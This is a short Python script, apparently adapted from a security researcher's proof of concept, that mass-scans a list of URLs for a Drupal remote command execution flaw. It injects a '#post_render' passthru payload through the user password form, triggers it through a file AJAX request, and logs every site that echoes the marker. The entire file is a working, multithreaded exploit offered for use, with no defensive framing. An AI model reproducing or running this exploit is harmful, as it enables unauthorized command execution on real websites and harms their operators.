# -*- coding: utf-8 -*-
#!/usr/bin/env python3

"""
Written by Christian Mehlmauer
  https://firefart.at/
  https://twitter.com/_FireFart_
  https://github.com/FireFart

remake for multi threading by l33t hacker lulz
"""

import sys
import requests
import re
from multiprocessing.dummy import Pool

requests.urllib3.disable_warnings()

try:
    target = [i.strip() for i in open(sys.argv[1], mode='r').readlines()]
except IndexError:
    exit('noob: pd.py list.txt')

def run(u):
    try:
        url=u
        get_params = {'q':'user/password', 'name[#post_render][]':'passthru', 'name[#markup]':'echo omelette', 'name[#type]':'markup'}
        post_params = {'form_id':'user_pass', '_triggering_element_name':'name'}
        r = requests.post(url, data=post_params, params=get_params,verify=False)
        m = re.search(r'<input type="hidden" name="form_build_id" value="([^"]+)" />', r.text)
        if m:
            found = m.group(1)
            get_params = {'q':'file/ajax/name/#value/' + found}
            post_params = {'form_build_id':found}
            r = requests.post(url, data=post_params, params=get_params,verify=False)
            if("omelette" in r.text):
                    open("bvfrero","a").write(url+"\n")
            print(r.text)
    except:
        pass

mp = Pool(120)
mp.map(run, target)
mp.close()
mp.join()
